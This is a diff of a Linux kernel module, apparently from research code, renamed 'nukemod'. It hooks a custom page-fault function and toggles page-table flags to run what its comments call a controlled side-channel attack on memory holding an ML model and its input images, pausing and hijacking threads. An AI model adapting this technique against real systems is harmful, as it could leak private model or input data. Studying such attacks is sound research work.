@@ -54,27 +54,27 @@ static int Device_Open = 0;
 
 // Kprobe struct used to add code to the page fault handler
 // NOTE: notify_attack is actually a function we added to the
-// kernel and that is why microscope requires a custom kernel.
+// kernel and that is why nukemod requires a custom kernel.
 static struct kprobe kp = {
 	.symbol_name = "notify_attack",
 };
 
-// Microscope variables
+// Nukemod variables
 static uint64_t fault_cnt = 0, fault_fault_cnt = 0;
 
-// APA variables
-static struct nuke_info_t special;
-static struct nuke_info_t *nuke_info_head = NULL;
+// APA variables - also check sgx_scheduling repo to learn how these are used
+static struct nuke_info_t special;					// This stores the address of the model
+static struct nuke_info_t *nuke_info_head = NULL;	// This stores the addresses of the images
 static uint8_t monitoring = 0, hijack_done = 0, resume_hijacked_thread = 0, last_iteration = 0;
 static int thread_count = 0, join_count = 0;
 static DEFINE_SPINLOCK(lock_for_waiting);
 static DECLARE_WAIT_QUEUE_HEAD(waiting_wait_queue);
 
+// Note: for now this is hard-coded to work with 4 user-space threads
 static pid_t max_pid;
 static uint8_t counter[3];
 static uint8_t halted = 0;
-
-#define SIG_RICCARDO 44
+static int signal_calls = 0;
 
 static struct task_struct *sig_tsk = NULL;
 static int sig_tosend = SIGTERM;
@@ -106,7 +106,6 @@ static int device_release(struct inode *inode, struct file *file)
 	return 0;
 }
 
-static int signal_calls = 0;
 /*
  * device_write identifies the requested write from IOCTL and routes it to the proper function.
  */
@@ -210,10 +209,6 @@ static ssize_t device_write(struct file *file, const char __user *buffer, size_t
 
 /*
  * device_ioctl services IOCTL requests to this character device
- * MSG - Just store the message into the char device (nothing microscope-related)
- * NUKE_ADDR - Pass the address to nuke (e.g., the replay handle)
- * MONITOR_ADDR - Pass the base monitor address (e.g. the AES Td tables), we will search for the actual one
- * PREP_PF - Set up the replay mechanism through page faults.
  */
 long device_ioctl(struct file *file, unsigned int ioctl_num, unsigned long ioctl_param)
 {
@@ -283,7 +278,7 @@ static int handler_fault(struct kprobe *p, struct pt_regs *regs, int trapnr)
 	fault_fault_cnt++;
 	pr_info("fault-on-fault\n");
 
-	// Cancel this nuke
+	// Cancel the current page fault
 	if (!(pte_flags(pte) & _PAGE_PRESENT) && (pte_flags(pte) & _PAGE_PROTNONE)) {
 		temp_pte = pte_set_flags(pte, _PAGE_PRESENT);
 		set_pte(faulting_pte, temp_pte);
@@ -297,7 +292,7 @@ static int handler_fault(struct kprobe *p, struct pt_regs *regs, int trapnr)
 }
 
 /*
- * pre_handler is invoked before the notify_attack (memory.c)
+ * pre_handler is invoked before notify_attack (memory.c)
  * we don't have to perform any steps here.
  */
 static int pre_handler(struct kprobe *p, struct pt_regs *regs) { return 0; }
@@ -321,12 +316,19 @@ static int pte_in_list(uint64_t v0)
 	return 0;
 }
 
+/*
+ * post_handler is invoked after notify_attack (memory.c)
+ * this function contains the main logic of our controlled side channel attack.
+ */
 static void post_handler(struct kprobe *p, struct pt_regs *regs, unsigned long flags)
 {
 	int i;
 	uint64_t v0 = 0, v1 = 0;
 	pte_t pte, temp_pte, *faulting_pte;
-	faulting_pte = (pte_t *)regs->di; // get arg from notify_attack (second arg is si)
+
+	// Get arg from notify_attack (second arg is si in x86)
+	// Also see: https://stackoverflow.com/a/10574586/5192980)
+	faulting_pte = (pte_t *)regs->di;
 	pte = *faulting_pte;
 	pid_t tid = current->pid;
 
@@ -338,7 +340,8 @@ static void post_handler(struct kprobe *p, struct pt_regs *regs, unsigned long f
 			// Check if the pte of the current page fault could be of interest
 			v0 = pte_pfn(*faulting_pte);
 			v1 = pte_pfn(*(special.nuke_pte));
-			if (pte_in_list(v0) == 1) {
+			
+			if (pte_in_list(v0) == 1) {	// fault on an image
 
 				// Check if the pte of the current page fault is of the stored addresses
 				if (!(pte_flags(pte) & _PAGE_PRESENT) && (pte_flags(pte) & _PAGE_PROTNONE)) {
@@ -390,14 +393,16 @@ static void post_handler(struct kprobe *p, struct pt_regs *regs, unsigned long f
 						// Wait until ready to resume
 						wait_event_interruptible(waiting_wait_queue, resume_hijacked_thread == 1);
 						pr_info("Now hijacked thread is resuming too!\n");
+
 						//uint64_t junk = 0;
 						//for (junk = 0; junk < 494967295; junk++) {;}
 						//pr_info("Done sleeping\n");
+						
 						// msleep(3000);
 					}
 				}
 
-			} else if (v0 == v1) {
+			} else if (v0 == v1) { // fault on the model
 
 				// Check if the pte of the current page fault is of the special addresses
 				if (!(pte_flags(pte) & _PAGE_PRESENT) && (pte_flags(pte) & _PAGE_PROTNONE)) {
@@ -434,7 +439,6 @@ static void post_handler(struct kprobe *p, struct pt_regs *regs, unsigned long f
 								temp_pte = pte_set_flags(*(tmp->nuke_pte), _PAGE_PRESENT);
 								set_pte(tmp->nuke_pte, temp_pte);
 							}
-
 							tmp = tmp->next;
 						}
 						
